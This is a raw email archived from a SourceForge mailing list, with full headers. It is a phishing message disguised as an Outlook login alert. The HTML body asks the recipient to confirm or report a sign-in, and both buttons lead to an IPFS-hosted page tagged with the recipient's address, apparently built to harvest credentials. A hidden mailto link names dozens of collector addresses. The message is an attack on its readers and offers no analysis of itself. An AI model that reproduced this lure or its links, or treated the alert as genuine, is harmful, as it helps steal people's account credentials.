Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 28C149299A2
	for <lists+industrypack-devel@lfdr.de>; Sun,  7 Jul 2024 22:03:15 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sQY6M-0004t1-DV
	for lists+industrypack-devel@lfdr.de;
	Sun, 07 Jul 2024 20:03:13 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <industrypack-devel@lists.sourceforge.net>)
 id 1sQY6K-0004sv-JK for industrypack-devel@lists.sourceforge.net;
 Sun, 07 Jul 2024 20:03:12 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=M2v4SMKckqIDg/nTtdhKXGYahfMx+ZYTjT2oFuud57A=; b=L8Y0YNmsjKZVJU7GwTov4vxs/k
 xs6GI5pU/LeK4dypdD/IpEyl/mFjCf1AazyDSLciev7ZskRc4GOW1qA8ahmEcRlY2pjwmSopSjDPo
 JO8f96EWo8uZPCsi2Q4oWtrNCI3VSeKJ1ibHTg4Nv7HAKRs4L9ebjzqzzGGclDjWgD7w=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=M2v4SMKckqIDg/nTtdhKXGYahfMx+ZYTjT2oFuud57A=; b=j
 ZTBIbzNVgtbCkZoQESsWMUxhxsSURvsUhtr5+yHkJjm9BL9YiNNJtBUoTzKtUrw1j7kjVw5/LV5Z8
 tJU/9LalhypIygpDVsrbur1AA1JGZaY2eLn5xGWT1GiRbH/fbvkQKfjBP/RxS03pGO73ldCg/iCwY
 nHBpqjwuQFgLCd1M=;
Received: from [85.17.9.170] by sfi-mx-2.v28.lw.sourceforge.com with esmtp 
 (Exim 4.95) id 1sQY6J-0003Yg-R3
 for industrypack-devel@lists.sourceforge.net;
 Sun, 07 Jul 2024 20:03:11 +0000
To: industrypack-devel@lists.sourceforge.net
Date: 7 Jul 2024 13:02:59 -0700
Message-ID: <20240707130259.3EF49F81143D14DA@lists.sourceforge.net>
MIME-Version: 1.0
X-Spam-Score: 0.2 (/)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Hello industrypack-devel@lists.sourceforge.net,
 Someone logged
 into your mail account on 7/7/2024 1:02:59 p.m. using Google Chrome. we just
 wanted to make sure it was you! If you don't think this was you. please report
 this so we can keep your acco [...] 
 Content analysis details:   (0.2 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: lighthouse.storage]
 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [85.17.9.170 listed in bl.score.senderscore.com]
 -5.0 RCVD_IN_DNSWL_HI       RBL: Sender listed at https://www.dnswl.org/,
 high trust [85.17.9.170 listed in list.dnswl.org]
 0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE:
 The query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [85.17.9.170 listed in sa-trusted.bondedsender.org]
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 1.1 DKIM_ADSP_ALL          No valid author signature, domain signs all mail
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 TO_EQ_FM_DIRECT_MX     To == From and direct-to-MX
 0.0 TO_EQ_FM_HTML_ONLY     To == From and HTML only
 0.8 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
 only
 0.9 TO_EQ_FM_DOM_HTML_ONLY To domain == From domain and HTML only
X-Headers-End: 1sQY6J-0003Yg-R3
Subject: [Industrypack-devel] Mailbox Alert: Someone Iogged in To Your Mail
 Account
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: Outlook via Industrypack-devel <industrypack-devel@lists.sourceforge.net>
Reply-To: Outlook <industrypack-devel@lists.sourceforge.net>
Content-Type: multipart/mixed; boundary="===============7392237217234454541=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============7392237217234454541==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
<meta name=3D"GENERATOR" content=3D"MSHTML 8.00.7601.17514"></head>
<body style=3D"margin: 0.4em;">
<table style=3D"width: 420px; color: rgb(34, 34, 34); text-transform: none;=
 letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
pace: normal; border-collapse: collapse; orphans: 2; widows: 2; font-varian=
t-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: =
0px; text-decoration-thickness: initial; text-decoration-style: initial; te=
xt-decoration-color: initial;" border=3D"0"=20
cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td style=3D"margin: 0px;"><=
table style=3D"width: 388px; border-collapse: collapse;" border=3D"0" cells=
pacing=3D"0" cellpadding=3D"0"><tbody><tr><td style=3D"margin: 0px; height:=
 32px; vertical-align: middle;">
<a style=3D"color: rgb(59, 89, 152); text-decoration: none;"=20
href=3D"mailto:admin@delta-nolth.org;contact@hootpol.com;bluegranaa@op.pl;s=
oimarinws@mailo.com;sarahcaraat@yandex.kz;3575719300@qq.com;sambradir@yande=
x.ru;bluegranaa@onet.pl;sambradir@yandex.ee;samandraluiss@mail.lv;dkmarket0=
1@126.com;servikalay@gmail.com;slezarazodf@yandex.lt;bluegranaa@vp.pl;loldz=
pol100@laposte.net;seseria@yandex.md;ivitarescoo@gmail.com;samarsamaritaa@y=
andex.uz;sambradir@yandex.com;mariadeltora@interia.pl;namialaydes@e1.ru;oli=
viaaamandaroz@gmail.com;samanthabostonnews@protonmai
&#10;l.com;samartinakarmin@yandex.com.tr;cvc3@qq.com;saartaa@europamel.net;=
bluegranaa@poczta.onet.pl;welcomeoffers22@gazeta.pl;amandaruse@naver.com;dk=
market@foxmail.com;supportdkmarket@zohomail.com;sarahcaraat@yandex.by;sambr=
adir@ya.ru;serviiiceoffetr23@outlook.com;dkmarket01@163.com;dkmarket01@yeah=
=2Enet;safiamarianj@yandex.co.il;amandancbn22@aliyun.com;serviiiceoffetr22@=
hotmail.com;sarahmariaaa@yandex.com.tj;bluegranaa@onet.eu;ll60671@ukr.net;m=
arianbcfamily@protonmail.com?subject=3DSend%2BStatemen
t&amp;&#10;;;body=3D%20it%20wasn%27t%20me%20" target=3D"_blank"><span style=
=3D'font-family: Roboto-Medium, Roboto, -apple-system, BlinkMacSystemFont, =
"Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 25px;'><br></spa=
n></a></td></tr><tr><td style=3D"margin: 0px;"><font size=3D"1"></font></td=
></tr></tbody></table></td><td style=3D"margin: 0px; width: 16px;"><font si=
ze=3D"1"></font></td></tr><tr><td style=3D"margin: 0px; width: 16px;"><font=
 size=3D"1">&nbsp;&nbsp;&nbsp;</font></td><td style=3D"margin: 0px;">
<table style=3D"width: 388px; border-collapse: collapse;" border=3D"0" cell=
spacing=3D"0" cellpadding=3D"0"><tbody><tr><td style=3D"margin: 0px;"><font=
 size=3D"1">&nbsp;</font></td></tr><tr><td style=3D"margin: 0px;"><span sty=
le=3D'color: rgb(5, 5, 5); font-family: Roboto-Regular, Roboto, -apple-syst=
em, BlinkMacSystemFont, "Helvetica Neue", Helvetica, Arial, sans-serif;'>He=
llo industrypack-devel@lists.sourceforge.net,<br><br>
 Someone logged into your mail account on&nbsp;7/7/2024 1:02:59 p.m. using =
Google Chrome. we just wanted to make sure it was you! If you don't think t=
his was you. please report this so we can keep your account safe.</span></t=
d></tr><tr><td style=3D"margin: 0px;">&nbsp;</td></tr><tr><td style=3D"marg=
in: 0px;"><table style=3D"width: 388px; border-collapse: collapse;" border=
=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr>
<td style=3D"margin: 0px; border-radius: 6px; text-align: center; border-co=
llapse: collapse; background-color: rgb(24, 119, 242);"><p><a style=3D"colo=
r: rgb(17, 85, 204);" href=3D"https://gateway.lighthouse.storage/ipfs/bafkr=
eidsw4el5ro4bofei2s62k57busvnkrxpspc72736o3x2f4lwz5gei#industrypack-devel@l=
ists.sourceforge.net" target=3D"_blank"><span style=3D'color: rgb(255, 255,=
 255); font-family: Roboto-Medium, Roboto, -apple-system, BlinkMacSystemFon=
t, "Helvetica Neue", Helvetica, Arial, sans-serif;'>Report the user</span><=
/a></p></td>
</tr>
</tbody></table></td></tr><tr><td style=3D"margin: 0px;">&nbsp;</td></tr><t=
r><td style=3D"margin: 0px;"><table style=3D"width: 388px; border-collapse:=
 collapse;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td=
 style=3D"margin: 0px; border-radius: 6px; text-align: center; border-colla=
pse: collapse; background-color: rgb(228, 230, 235);"><p>
<a style=3D"color: rgb(17, 85, 204);" href=3D"https://gateway.lighthouse.st=
orage/ipfs/bafkreidsw4el5ro4bofei2s62k57busvnkrxpspc72736o3x2f4lwz5gei#indu=
strypack-devel@lists.sourceforge.net" target=3D"_blank"><span style=3D'colo=
r: rgb(5, 5, 5); font-family: Roboto-Medium, Roboto, -apple-system, BlinkMa=
cSystemFont, "Helvetica Neue", Helvetica, Arial, sans-serif;'>Yes, me</span=
></a></p></td></tr></tbody></table></td></tr><tr><td style=3D"margin: 0px;"=
>&nbsp;</td></tr><tr><td style=3D"margin: 0px;">&nbsp;</td></tr></tbody></t=
able></td>
<td style=3D"margin: 0px; width: 16px;"><font size=3D"1"> &nbsp;&nbsp;&nbsp=
;</font></td></tr><tr><td style=3D"margin: 0px; width: 16px;"><font size=3D=
"1">&nbsp;&nbsp;&nbsp;</font></td><td style=3D"margin: 0px;"><table align=
=3D"left" style=3D"width: 388px; border-collapse: collapse;" border=3D"0" c=
ellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td style=3D"margin: 0px;"><s=
pan style=3D'font-family: "Helvetica Neue", Helvetica, "Lucida Grande", tah=
oma, verdana, arial, sans-serif;'>Thanks<br>The Outlook Team</span></td>
</tr></tbody></table></td></tr></tbody></table></body></html>


--===============7392237217234454541==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============7392237217234454541==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============7392237217234454541==--
